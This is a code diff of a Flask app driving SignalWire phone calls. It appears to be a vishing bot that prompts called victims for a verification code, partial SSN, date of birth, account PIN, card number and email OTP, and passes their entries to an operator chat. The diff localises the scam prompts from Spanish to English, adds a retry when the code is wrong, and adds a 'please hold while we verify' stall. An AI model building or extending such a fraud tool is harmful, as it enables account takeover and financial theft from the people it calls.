@@ -262,40 +262,56 @@ def codigo_webhook(call_sid, chat_id):
 @flask_app.route("/accion_llamada/<call_sid>/<accion>", methods=["GET"])
 def accion_llamada(call_sid, accion):
     """SignalWire llama aquí para obtener las instrucciones siguientes"""
+    session = call_sessions.get(call_sid, {})
+    chat_id = session.get("chat_id", ADMIN_CHAT_ID)
     response = VoiceResponse()
 
-    mensajes = {
-        "valido":  "Su codigo ha sido validado correctamente. Gracias.",
-        "invalido": "Lo sentimos, el codigo ingresado es incorrecto. Por favor intente de nuevo.",
-        "ssn":     "Por favor ingrese los ultimos 3 digitos de su numero de seguro social.",
-        "dob":     "Por favor ingrese su fecha de nacimiento en formato mes, dia, ano.",
-        "pin":     "Por favor ingrese su PIN de cuenta.",
-        "card":    "Por favor ingrese su numero de tarjeta.",
-        "mailotp": "Le hemos enviado un codigo de verificacion a su correo electronico. Por favor ingreselo ahora.",
-        "colgar":  "Gracias por llamar. Hasta luego.",
-    }
-
-    if accion == "colgar":
-        response.say(mensajes["colgar"], language="es-MX", rate="85%")
+    if accion == "valido":
+        response.say("Your code has been successfully validated. Thank you for verifying. Have a great day.", language="en-US", rate="85%")
         response.hangup()
+
+    elif accion == "invalido":
+        # Pedir el código de nuevo
+        gather = Gather(
+            num_digits=6,
+            action=f"{WEBHOOK_BASE_URL}/codigo/{call_sid}/{chat_id}",
+            method="POST",
+            timeout=20,
+            finish_on_key=""
+        )
+        gather.say("We're sorry, the code you entered is incorrect. Please enter your 6 digit verification code again.", language="en-US", rate="85%")
+        response.append(gather)
+        response.say("We did not receive your code. Please try again later. Goodbye.", language="en-US", rate="85%")
+        response.hangup()
+
+    elif accion == "colgar":
+        response.say("Thank you for calling. Goodbye.", language="en-US", rate="85%")
+        response.hangup()
+
     elif accion in ["ssn", "dob", "pin", "card", "mailotp"]:
-        session = call_sessions.get(call_sid, {})
-        chat_id = session.get("chat_id", ADMIN_CHAT_ID)
-        digitos = {"ssn": 3, "dob": 8, "pin": 4, "card": 16, "mailotp": 6}
+        digitos  = {"ssn": 3, "dob": 8, "pin": 4, "card": 16, "mailotp": 6}
+        mensajes = {
+            "ssn":     "Please enter the last 3 digits of your Social Security Number.",
+            "dob":     "Please enter your date of birth in the format month, day, year.",
+            "pin":     "Please enter your account PIN.",
+            "card":    "Please enter your card number.",
+            "mailotp": "We have sent a verification code to your email address. Please enter it now.",
+        }
         num_dig = digitos.get(accion, 6)
         gather = Gather(
             num_digits=num_dig,
             action=f"{WEBHOOK_BASE_URL}/codigo2/{call_sid}/{chat_id}/{accion}",
             method="POST",
-            timeout=15,
+            timeout=20,
             finish_on_key=""
         )
-        gather.say(mensajes[accion], language="es-MX", rate="85%")
+        gather.say(mensajes[accion], language="en-US", rate="85%")
         response.append(gather)
-        response.say("No recibimos su respuesta. Hasta luego.", language="es-MX", rate="85%")
+        response.say("We did not receive your response. Goodbye.", language="en-US", rate="85%")
         response.hangup()
+
     else:
-        response.say(mensajes.get(accion, "Gracias."), language="es-MX", rate="85%")
+        response.say("Thank you. Goodbye.", language="en-US", rate="85%")
         response.hangup()
 
     return Response(str(response), mimetype="text/xml")
@@ -334,9 +350,9 @@ def codigo2_webhook(call_sid, chat_id, tipo):
         log.error(e)
 
     response = VoiceResponse()
-    response.say("Hemos recibido su informacion. Por favor espere.", language="es-MX", rate="85%")
+    response.say("Thank you. We have received your information. Please hold while we verify.", language="en-US", rate="85%")
     response.pause(length=30)
-    response.say("Gracias. Hasta luego.", language="es-MX", rate="85%")
+    response.say("Thank you for your patience. Goodbye.", language="en-US", rate="85%")
     response.hangup()
     return Response(str(response), mimetype="text/xml")
 
